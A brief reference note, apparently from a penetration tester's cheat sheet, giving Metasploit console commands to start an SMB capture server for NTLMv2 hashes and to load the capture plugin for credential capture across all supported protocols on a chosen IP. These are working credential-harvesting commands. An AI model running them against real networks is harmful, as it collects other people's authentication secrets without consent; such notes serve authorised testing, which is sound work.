# Start capturing NTLMv2 over SMB
```ruby
use auxiliary/server/capture/smb
set VERBOSE true
run
```

# Start capturing all supported protocols
```ruby
load capture
captureg start --ip <ip>
```
